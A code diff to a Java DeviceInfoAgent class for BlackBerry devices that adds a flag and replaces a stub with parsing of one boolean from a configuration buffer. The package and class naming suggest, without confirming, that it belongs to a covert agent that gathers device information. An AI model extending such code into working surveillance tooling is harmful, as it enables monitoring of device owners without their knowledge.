@@ -1,9 +1,12 @@
 package blackberry.agent;
 
+import java.io.EOFException;
+
 import net.rim.blackberry.api.pdap.BlackBerryContact;
 import net.rim.device.api.system.ApplicationDescriptor;
 import net.rim.device.api.system.ApplicationManager;
 import net.rim.device.api.system.DeviceInfo;
+import net.rim.device.api.util.DataBuffer;
 import blackberry.Device;
 import blackberry.log.Log;
 import blackberry.log.LogType;
@@ -16,6 +19,7 @@ public class DeviceInfoAgent extends Agent {
 	static Debug debug = new Debug("DeviceInfoAgent", DebugLevel.VERBOSE);
 
 	Device device;
+	boolean runningApplication;
 
 	public DeviceInfoAgent(final boolean agentStatus) {
 		super(AGENT_DEVICE, agentStatus, true, "DeviceInfoAgent");
@@ -168,9 +172,15 @@ public class DeviceInfoAgent extends Agent {
 		return sb.toString();
 	}
 
-	protected boolean parse(final byte[] confParameters) {
-		// TODO Auto-generated method stub
-		return false;
+	protected boolean parse(final byte[] confParams) {
+		DataBuffer databuffer = new DataBuffer(confParams, 0,
+				confParams.length, false);
+		try {
+			runningApplication = databuffer.readBoolean();
+		} catch (EOFException e) {
+			return false;
+		}
+		return true;
 	}
 
 }
